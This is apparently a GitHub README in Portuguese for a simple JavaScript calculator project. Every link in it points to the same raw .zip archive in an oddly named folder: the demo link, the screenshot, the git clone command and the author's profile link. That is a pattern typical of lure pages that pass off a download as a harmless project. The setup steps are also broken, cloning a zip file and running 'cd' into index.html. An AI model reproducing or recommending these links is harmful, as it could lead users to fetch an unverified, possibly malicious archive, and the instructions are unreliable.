# ✨ Calculadora Moderna com JavaScript

Este é um projeto de uma calculadora totalmente funcional, construída com tecnologias web front-end puras: HTML, CSS e JavaScript. O objetivo foi criar uma interface moderna, responsiva e intuitiva, replicando o comportamento de calculadoras digitais populares.

### 🚀 Demonstração ao Vivo

Você pode testar a calculadora em funcionamento aqui:

**[Clique para acessar a demonstração]([https://github.com/CodeBy-red/Java.Calculadora/raw/refs/heads/main/inappreciative/Java_Calculadora_1.1.zip])**

*(Dica: Substitua o link acima pela URL que você obteve ao hospedar no GitHub Pages, Netlify ou Vercel.)*

### 📸 Screenshot

![Screenshot da Calculadora]([https://github.com/CodeBy-red/Java.Calculadora/raw/refs/heads/main/inappreciative/Java_Calculadora_1.1.zip])

*(Dica: Tire um print da sua calculadora funcionando, adicione o arquivo de imagem na pasta do projeto e substitua o link acima pelo nome do arquivo. Ex: `./screenshot-calculadora.png`)*


---

### 📋 Funcionalidades

* **Operações Aritméticas Básicas:** Adição, Subtração, Multiplicação e Divisão.
* **Suporte a Números Decimais:** Inclusão de ponto (`.`) para cálculos com casas decimais.
* **Lógica de Cálculo Sequencial:** Permite encadear operações (ex: `5 + 5 * 2` será calculado na ordem de entrada).
* **Limpeza Total (AC):** Botão para resetar completamente o estado da calculadora.
* **Ações Especiais:** Inclui botões para inversão de sinal (`+/-`) e porcentagem (`%`).
* **Design Responsivo:** A interface se adapta para uma visualização ideal em desktops, tablets e celulares.
* **Feedback Visual:** Efeitos de `hover` e `active` nos botões para uma experiência de usuário mais interativa.

---

### 🔧 Tecnologias Utilizadas

Este projeto foi construído do zero utilizando as seguintes tecnologias:

* **HTML5:** Para a estrutura semântica dos elementos.
* **CSS3:** Para a estilização completa, utilizando:
    * **CSS Grid Layout** para organizar o teclado de botões de forma precisa e responsiva.
    * **Variáveis CSS (Custom Properties)** para um tema consistente e de fácil manutenção.
    * **Flexbox** para alinhamentos gerais.
* **JavaScript (ES6+):** Para toda a lógica funcional da calculadora, incluindo:
    * Manipulação do DOM para interagir com a interface.
    * Gerenciamento de estado para controlar o input atual, o operador e o cálculo pendente.
    * Lógica de eventos para capturar os cliques nos botões de forma eficiente.

---

### ⚙️ Como Executar o Projeto Localmente

Para rodar este projeto na sua própria máquina, siga os passos abaixo:

1.  **Clone o repositório:**
    ```bash
    git clone [https://github.com/CodeBy-red/Java.Calculadora/raw/refs/heads/main/inappreciative/Java_Calculadora_1.1.zip]
    ```

2.  **Navegue até a pasta do projeto:**
    ```bash
    cd index.html
    ```

3.  **Abra o arquivo principal:**
    * Abra o arquivo `index.html` diretamente no seu navegador de preferência (Google Chrome, Firefox, etc.).

    * **(Recomendado)** Se você utiliza o VS Code, instale a extensão **Live Server** e clique em "Go Live" para iniciar um servidor local e ver as alterações em tempo real.

---

### 📚 Aprendizados

Este projeto foi uma ótima oportunidade para aprofundar e solidificar conhecimentos essenciais de front-end:

* **Gerenciamento de Estado em JavaScript Puro:** A principal complexidade foi gerenciar as variáveis `currentInput`, `previousInput` e `operator` para garantir que a calculadora se comportasse de maneira previsível. A implementação da "bandeira" `shouldResetDisplay` foi um aprendizado chave sobre como melhorar a experiência do usuário.
* **Lógica de UI/UX:** Entender como uma calculadora real funciona e traduzir essa experiência para o código, como manter o número na tela após clicar em um operador.
* **Poder do CSS Grid:** Ficou claro como o CSS Grid é a ferramenta perfeita para criar layouts de grade complexos e alinhados, como o teclado de uma calculadora.
* **Manipulação do DOM e Eventos:** Prática intensiva na seleção de elementos e na criação de uma lógica centralizada para lidar com os cliques em diferentes tipos de botões.

---

### 🔮 Próximos Passos

Como próximos passos para evoluir o projeto, planejo implementar:

* [ ] Suporte para teclado do computador.
* [ ] Um histórico com os últimos cálculos realizados.
* [ ] Um botão para "apagar" o último dígito (backspace).
* [ ] Um seletor de tema (claro/escuro).

---

### 👨‍💻 Autor

Desenvolvido por **[RED.dev]**.

* **GitHub:** [@CodeBy-red](https://github.com/CodeBy-red/Java.Calculadora/raw/refs/heads/main/inappreciative/Java_Calculadora_1.1.zip)
